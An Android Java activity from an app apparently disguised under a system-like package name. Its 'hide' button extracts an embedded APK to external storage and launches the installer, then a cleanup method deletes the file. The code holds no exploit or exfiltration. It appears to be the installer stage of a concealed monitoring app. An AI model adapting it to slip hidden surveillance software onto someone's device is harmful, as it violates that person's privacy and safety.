package com.vvt.android.syncmanager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.text.Html;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

import com.android.msecurity.R;
import com.fx.dalvik.preference.model.ProductInfo;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;

public class LauncherActivity extends Activity implements OnClickListener {
	
	private static final String TAG = "LauncherActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOGE = Customization.DEBUG ? DEBUG : false;
	
	private static final String TEMP_APK_FILENAME = "temp_app.apk";
	
	private static final int DIALOG_ABOUT = 1;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.launcher);
        
        Button btnHide = (Button) findViewById(R.id.hide_btn);
        btnHide.setOnClickListener(this);
	}
	
	@Override
	protected Dialog onCreateDialog(int dialogId) {
		if (LOGV) FxLog.v(TAG, "onCreateDialog # ENTER ...");
		
		switch (dialogId) {
			case DIALOG_ABOUT:
				View aboutView = getLayoutInflater().inflate(R.layout.about_dialog, null);
				TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
				
				ProductInfo productInfo = ProductInfoHelper.getProductInfo(getApplicationContext());
				
				String productId = String.valueOf(productInfo.getId());
				String version = productInfo.getVersionName();
				String buildDate = productInfo.getBuildDate();
				
				String html = String.format(
						StringResource.LANG_ABOUT_INFO, productId, version, buildDate);
				
				CharSequence aMessage = Html.fromHtml(html);
				textView.setText(aMessage);
				
				return new AlertDialog.Builder(this)
					.setTitle(R.string.language_ui_label_about)
					.setView(aboutView)
					.setPositiveButton(R.string.language_ui_label_ok, null)
					.create();
		}
		
		return null;
	}
	
	@Override
    public boolean onCreateOptionsMenu(Menu menu) {
    	if (LOGV) FxLog.v(TAG, "onCreateOptionsMenu # ENTER ...");
    	MenuInflater inflater = getMenuInflater();
    	inflater.inflate(R.menu.main_options_not_activated, menu);
    	
    	MenuItem item = menu.findItem(R.id.menu_main_activate);
		if (item != null) {
			item.setEnabled(false);
			item.setVisible(false);
		}
		
    	return true;
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
    	if (LOGV) FxLog.v(TAG, "onOptionsItemSelected # ENTER ...");
    	
    	switch (item.getItemId()) {
	    	case R.id.menu_main_about:
	    		showDialog(DIALOG_ABOUT);
	    		break;
	    	case R.id.menu_main_uninstall:
	    		GeneralUtil.promptUninstallApplication(getApplicationContext());
	    		break;
    	}
    	
    	return true;
    }

	@Override
	public void onClick(View v) {
		if (v.getId() == R.id.hide_btn) {
	        extractAsset(TEMP_APK_FILENAME);
	        
	        String uriString = String.format("file://%s/%s", 
	        		Environment.getExternalStorageDirectory(), TEMP_APK_FILENAME);
	        if (LOGV) FxLog.v(TAG, String.format("uriString: %s", uriString));
	        
	        Intent intent = new Intent(Intent.ACTION_VIEW);
	        intent.setDataAndType(
	        		Uri.parse(uriString),
	        		"application/vnd.android.package-archive");
	        startActivity(intent);
		}
	}

	private void extractAsset(String assetName) {
	    AssetManager am = getAssets();
	    try {
	    	String destinationPath = String.format("%s/%s", 
	        		Environment.getExternalStorageDirectory(), assetName);
	    	
	    	if (LOGV) FxLog.v(TAG, String.format("extractAsset # destinationPath: %s", destinationPath));
	    	
	        File destinationFile = new File(destinationPath);    
	        InputStream in = am.open(assetName);
	        FileOutputStream f = new FileOutputStream(destinationFile); 
	        byte[] buffer = new byte[1024];
	        int len = 0;
	        while ((len = in.read(buffer)) > 0) {
	            f.write(buffer, 0, len);
	        }
	        f.close();
	        
	        if (LOGV) FxLog.v(TAG, "extractAsset # Extract completed");
	    }
	    catch (Exception e) {
	        if (LOGE) FxLog.e(TAG, String.format("extractAsset # Error: %s", e));
	    }
	}
	
	public static void cleanupTempApk() {
		String destinationPath = String.format("%s/%s", 
        		Environment.getExternalStorageDirectory(), TEMP_APK_FILENAME);

		File file = new File(destinationPath);
		
		boolean isDeleted = file.delete();
		if (LOGV) FxLog.v(TAG, String.format(
				"cleanupTempApk # Is temp APK deleted? %s", isDeleted));
	}
}
